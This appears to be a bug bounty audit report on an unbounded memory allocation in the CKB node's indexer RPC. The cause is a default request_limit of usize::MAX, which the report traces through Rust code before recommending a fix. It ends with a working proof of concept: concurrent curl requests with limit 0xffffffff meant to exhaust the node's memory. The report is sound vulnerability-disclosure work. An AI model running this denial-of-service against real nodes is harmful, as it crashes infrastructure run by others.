All cited code has been verified against the actual repository. The claims are accurate:

Audit Report

## Title
Unbounded Memory Allocation via Indexer RPC `get_cells`/`get_transactions` with Default `request_limit` — (`util/indexer/src/service.rs`)

## Summary
When `IndexerConfig.request_limit` is `None` (the default out-of-the-box configuration), `IndexerService::new` stores `usize::MAX` as the internal limit. The guard in `get_cells` and `get_transactions` that rejects oversized `limit` values is trivially bypassed because any caller-supplied `u32` value cast to `usize` is always less than `usize::MAX` on 64-bit platforms. The only real bound is a `TimeoutIterator` (default 10 seconds), which is a wall-clock bound, not a memory bound. Within that window, all matching RocksDB records are deserialized and heap-allocated into a single `Vec` before the response is sent, enabling an unprivileged RPC caller to cause severe memory pressure or OOM on the node.

## Finding Description

**Root cause — default config stores `usize::MAX`:**

`IndexerConfig.request_limit` defaults to `None` (`util/app-config/src/configs/indexer.rs` L39–40, L65). `IndexerService::new` converts this to `usize::MAX` (`util/indexer/src/service.rs` L98):
```rust
request_limit: config.request_limit.unwrap_or(usize::MAX),
```

**Guard is ineffective:**

In `get_cells` (`util/indexer/src/service.rs` L212–221):
```rust
let limit = limit.value() as usize;   // u32::MAX → 4_294_967_295usize
if limit == 0 { return Err(...) }
if limit > self.request_limit { ... } // 4_294_967_295 > usize::MAX → false on 64-bit
```
The same pattern exists in `get_transactions` (L388–397). Because `u32::MAX as usize` (4,294,967,295) is strictly less than `usize::MAX` (18,446,744,073,709,551,615) on any 64-bit platform, the rejection branch is never taken.

**Only bound is a time-based iterator:**

The iterator is wrapped in `TimeoutIterator` with a 10-second default (L242):
```rust
let mut iter = TimeoutIterator::new(snapshot.iterator(mode).skip(skip), self.timeout_limit);
```
`TimeoutIterator::next` checks elapsed wall-clock time (L55–61) and stops after 10 seconds, but does not cap bytes allocated. All records scanned before the timeout are materialized (L371–372):
```rust
.take(limit)
.collect::<Vec<_>>();
```
After the timeout, an error is returned (L373–374) and the `Vec` is dropped — but the peak allocation during the 10-second window is unbounded. `RichIndexerService` has the identical `usize::MAX` default (`util/rich-indexer/src/service.rs` L51).

**Exploit flow:**
1. Attacker sends `get_cells` with `limit = 0xFFFFFFFF` targeting a broad script prefix (e.g., empty `args`) against a populated indexer store.
2. The guard passes. A RocksDB snapshot iterator is opened and wrapped in `TimeoutIterator`.
3. For up to 10 seconds, records are deserialized and pushed into a heap-allocated `Vec<IndexerCell>`.
4. On a fast NVMe-backed node with millions of indexed cells, this can allocate hundreds of MB to several GB per request.
5. Multiple concurrent such requests compound peak RSS. The OS OOM-killer may terminate the `ckb` process.

## Impact Explanation
An unprivileged caller with network access to the RPC port can crash a CKB node by exhausting its memory. This matches the allowed bounty impact: **High (10001–15000 points) — Vulnerabilities which could easily crash a CKB node.** The node process is killed by the OOM-killer or becomes unresponsive to all traffic (including consensus-critical p2p messages) during the allocation window.

## Likelihood Explanation
- The vulnerable default (`request_limit = None` → `usize::MAX`) requires no operator misconfiguration; it is the out-of-the-box state.
- The RPC port is a standard, documented attack surface; many operators expose it for dApp integrations.
- The exploit requires a single JSON-RPC call with `limit = 0xFFFFFFFF`; no authentication or special privilege is needed.
- The attack is repeatable and easily parallelized (e.g., 4–8 concurrent requests) to amplify memory pressure.
- The `TimeoutIterator` mitigates a full store scan per request but does not prevent large allocations on populated stores within the 10-second window.

## Recommendation
1. Change the default for `request_limit` from `None`/`usize::MAX` to a safe bounded value (e.g., `500` or `1000`) in `IndexerConfig::default()` and in both `IndexerService::new` and `RichIndexerService::new`.
2. Alternatively, enforce a hard cap independent of configuration:
   ```rust
   const MAX_INDEXER_LIMIT: usize = 1000;
   let effective_limit = limit.min(self.request_limit).min(MAX_INDEXER_LIMIT);
   ```
3. Apply the same fix to `RichIndexerService` and `AsyncRichIndexerHandle`.

## Proof of Concept
```bash
# Against a node with default config and a populated indexer store:
for i in 1 2 3 4; do
  curl -s -X POST http://localhost:8114 \
    -H 'Content-Type: application/json' \
    -d '{
      "jsonrpc": "2.0",
      "method": "get_cells",
      "params": [
        {"script": {"code_hash": "0x9bd7e06f3ecf4be0f2fcd2188b23f1b9fcc88e5d4b65a8637b17723bbda3cce8",
                    "hash_type": "type", "args": "0x"},
         "script_type": "lock"},
        "asc",
        "0xffffffff",
        null
      ],
      "id": 1
    }' &
done
wait
# Monitor RSS of the ckb process during the 10-second scan window with:
# watch -n 0.5 'ps -o pid,rss,vsz -p $(pgrep ckb)'
# Each concurrent request allocates independently; peak RSS = N * (records_per_10s * record_size).
```